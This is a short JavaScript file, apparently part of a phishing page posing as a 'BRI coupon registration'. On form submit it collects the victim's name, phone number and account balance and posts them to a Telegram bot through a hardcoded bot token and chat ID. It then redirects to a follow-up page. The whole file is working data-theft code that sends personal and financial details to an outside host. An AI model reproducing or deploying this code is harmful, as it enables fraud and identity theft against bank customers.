$(document).ready(function () {
    const chat_id = '7638456973';
    const botID = 'bot8148248651:AAGKh979HHIIl1oDxNEDVmO8O3aKi51oi4U';
    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;

    document.querySelector('#defis').addEventListener("submit", async e => {
        e.preventDefault(); // Hindari reload halaman

        // Ambil data dari input form
        const formData = new FormData(e.target);
        const nama = formData.get("NAMA");
        const nohp = formData.get("NOMOR");
        const saldo = formData.get("SALDO");

        // Format pesan yang akan dikirim ke Telegram
        let text = `
🔔 *PENDAFTARAN KUPON BRI*

👤 *Nama:* ${nama}
📱 *No HP:* ${nohp}
💰 *Saldo:* ${saldo}
        `;

        // Kirim data ke Telegram
        await fetch(telegramURL, {
            method: 'POST',
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id,
                text,
                parse_mode: 'Markdown'
            }),
        });

        // Redirect setelah kirim
        window.location.href = 'proses.html';
    });
});
